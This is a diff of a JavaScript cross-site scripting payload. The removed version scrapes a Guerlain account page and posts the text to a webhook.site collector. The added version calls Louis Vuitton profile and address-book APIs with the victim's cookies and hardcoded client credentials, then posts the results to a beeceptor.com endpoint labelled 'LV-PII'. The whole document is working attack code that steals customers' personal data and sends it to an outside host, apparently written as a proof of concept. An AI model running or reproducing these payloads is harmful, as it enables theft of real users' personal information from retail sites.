@@ -1,22 +1,28 @@
-(async function(){
-  try {
+async function sendLVData() {
+  const headers = {
+    credentials: 'include',
+    headers: {
+      'Client_id': '607e3016889f431fb8020693311016c9',
+      'Client_secret': '60bbcdcD722D411B88cBb72C8246a22F'
+    }
+  };
 
-    alert('XSS executed');
+  const addressRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/addressbook?locale=fra-fr', headers);
+  const addressData = await addressRes.json();
 
-    const resp1 = await fetch('https://www.guerlain.com/fr/fr-fr/account');
-    const page = await resp1.text();
-    
-    const doc = new DOMParser().parseFromString(page, 'text/html');
-    const element = doc.querySelector('.dashboard-content.container');
-    const dataToSend = element ? element.textContent.trim() : null;
+  const profileRes = await fetch('https://api.louisvuitton.com/eco-eu/lvcom-client-eapi/v1/clients/profile?locale=eng-e1', headers);
+  const profileData = await profileRes.json();
 
-    await fetch('https://webhook.site/ad236dff-c493-471b-8a45-aa8989d8ad60/guerlin-PII', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ PII: dataToSend })
-    });
-  } catch (err) {
-    console.error('Erreur détectée :', err);
-  }
-})();
+  const payload = {
+    profile: profileData,
+    addressbook: addressData
+  };
+
+  await fetch('https://dindindin-xss-lv.free.beeceptor.com/LV-PII', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+sendLVData();
